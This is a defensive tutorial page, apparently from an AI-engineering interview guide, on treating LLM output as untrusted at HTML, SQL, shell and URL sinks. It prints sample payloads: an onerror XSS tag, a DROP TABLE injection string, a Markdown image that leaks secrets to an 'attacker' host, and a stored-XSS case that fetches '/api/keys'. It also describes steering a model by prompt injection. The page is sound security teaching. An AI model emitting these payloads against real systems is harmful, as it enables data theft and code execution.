# Insecure output handling

**What it is:** trusting the model's output as if a human wrote it — passing it straight into a browser, shell, database, or API call — when it might contain an attacker's payload.

## Why it matters for an AI Engineer

This is the threat that turns a "harmless chatbot" into a classic security hole (XSS, SQL injection, remote code execution). The model's output is **untrusted data**, no different from a form field a stranger typed into. The moment you render it as HTML, run it as code, or splice it into a query, every web-security rule you already know applies. AI Engineers get bitten here because they think about the *model* and forget the *plumbing after* the model. In an interview, showing you treat LLM output as untrusted — and knowing the specific sinks (HTML, SQL, shell, `eval`) — signals you're a real engineer, not just a prompt writer.

## The mechanism

An LLM can be steered (via prompt injection or jailbreak) to emit *anything*. If the text after it flows into a system that interprets text as commands, you get code execution:

- **XSS** — model output containing `<script>steal()</script>` rendered directly into a web page runs in the victim's browser.
- **SQL injection** — model-generated SQL, or model output interpolated into a query string, can read or drop tables.
- **Command injection** — an agent that runs model-suggested shell commands can be told to `rm -rf` or curl a payload.
- **SSRF / unsafe fetch** — model output containing a URL that your backend then fetches can hit internal services.
- **Broken Markdown/links** — a model-emitted image tag `![](http://attacker/?data=SECRET)` exfiltrates context via the URL when the client renders it.

<div class="diagram">
  <div class="flow">
    <span class="dbox purple">🧠 LLM output</span>
    <span class="darr">→<span class="lbl">NO check</span></span>
    <span class="dbox orange">&lt;script&gt; / DROP TABLE / rm -rf</span>
    <span class="darr">→</span>
    <span class="dbox gray">🌐 browser / 🗄️ DB / 💻 shell</span>
    <span class="darr">→</span>
    <span class="dbox orange">💥 XSS / SQLi / RCE</span>
  </div>
  <div class="dcap">If model output reaches an interpreter unescaped, you've built an injection vulnerability.</div>
</div>

The fix is the same one web security has used for decades: **never trust output; escape, parameterize, or sandbox at every sink.** The model doesn't change the rule — it just makes it easier to forget.

## Concrete example

The two most common mistakes and their fixes:

```python
import html, sqlite3

llm_answer = "<img src=x onerror=alert('xss')>"   # attacker-steered output

# WRONG: render raw into a page  →  XSS
page = f"<div>{llm_answer}</div>"

# RIGHT: escape before rendering
page = f"<div>{html.escape(llm_answer)}</div>"     # tags become inert text


# WRONG: splice model output into SQL  →  injection
name = "'; DROP TABLE users;--"                    # model could emit this
db.execute(f"SELECT * FROM users WHERE name = '{name}'")

# RIGHT: parameterize — value can never be executed as SQL
db.execute("SELECT * FROM users WHERE name = ?", (name,))
```

For agents that "run code," the answer is never `eval()` — it's a real [sandbox](sandboxing-least-privilege.md) (isolated container, no network, no host filesystem). For structured outputs, validate against a schema before use (see [input/output validation](input-output-validation.md)).

## How a company uses this

**A Dubai SaaS company** shipped an AI feature that let users ask questions over their data and rendered the answer as rich HTML in the dashboard. A pentest found that a user could store a document containing `<img src=x onerror="fetch('/api/keys').then(...)">`; when the assistant summarized it, the malicious tag was reflected into another user's admin view and ran — a stored-XSS-via-LLM. The fix was boring and correct: render all model output through a strict HTML sanitizer (allowlist of tags, no event handlers, no scripts), and set a Content-Security-Policy so inline scripts can't execute at all. They also switched their "run this query" analytics agent from string-built SQL to a parameterized query builder with a read-only DB role. No model changes — just treating output as untrusted at every sink.

## Common mistakes

- **Rendering model Markdown/HTML without sanitizing.** Images and links exfiltrate; scripts execute.
- **String-building SQL from model output.** Always parameterize; give the agent a least-privilege DB role.
- **`eval`/`exec` on model-generated code** without a real sandbox.
- **Auto-following URLs** the model produced, enabling SSRF to internal services.

## Interview tip
Say: *"LLM output is untrusted input — I apply the same rules as user input. Escape before rendering (and sanitize HTML with an allowlist + CSP), parameterize SQL, never `eval` model code outside a locked-down sandbox, and don't auto-fetch model-supplied URLs. The classic sinks — XSS, SQLi, RCE, SSRF — all reappear the moment you trust the output."* Naming the specific sinks and their standard fixes shows you connect LLM security to real application security.
